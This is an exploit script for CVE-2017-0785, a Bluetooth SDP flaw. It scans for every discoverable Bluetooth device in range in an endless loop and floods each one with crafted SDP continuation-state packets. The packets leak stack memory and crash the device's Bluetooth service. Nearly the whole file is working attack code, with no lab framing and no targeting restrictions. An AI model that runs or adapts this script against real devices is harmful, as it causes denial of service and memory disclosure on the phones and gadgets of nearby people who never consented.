#!/usr/bin/env python2
# CVE-2017-0785 

from pwn import *
import bluetooth

service_long = 0x0100
service_short = 0x0001
# Usually, sending more than 45~ packets causes a crash, but this can be up to around 7000
n = 10000

p = log.progress('BT Crash')
p.status('Searching...')

def packet(service, continuation_state):
	pkt = '\x02\x00\x00'
	pkt += p16(7 + len(continuation_state))
	pkt += '\x35\x03\x19'
	pkt += p16(service)
	pkt += '\x01\x00'
	pkt += continuation_state
	return pkt

def crasher(targetAddress, targetName, timeout):
	sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
	sock.settimeout(timeout)
	bluetooth.set_l2cap_mtu(sock, 50)
	context.endian = 'big'
	p.status('Connecting to %s (%s)', targetName, targetAddress)
	try:
		sock.connect((targetAddress, 1))
	except:
		p.status('%s (%s) connection timed out, could be recovering', targetName, targetAddress)
		return
	p.status('Sending packet 0')
	sock.send(packet(service_long, '\x00'))
	data = sock.recv(50)
	stack = ''
	try:
		for i in range(1, n):
			p.status('Sending packet %d' % i)
			sock.send(packet(service_short, data[-3:]))
			data = sock.recv(50)
			stack += data[9:-3]
	except KeyboardInterrupt:
		p.status('%s (%s) crash interrupted', targetName, targetAddress)
	except:
		p.status('%s (%s) crash attempt finished', targetName, targetAddress)
	finally:
		sock.close()
		return

def start(scanTime, timeout):
	p.status('Searching...')
	btDevices = bluetooth.discover_devices(duration = scanTime, lookup_names = True, flush_cache = True)
	for name, addr in btDevices: #`name` is actually the BT address, and `addr` is actually the device name!
		p.status('Crashing %s (%s)', name, addr)
		crasher(name, addr, timeout)
	return

while 1:
	start(3, 5)

p.success('Done')
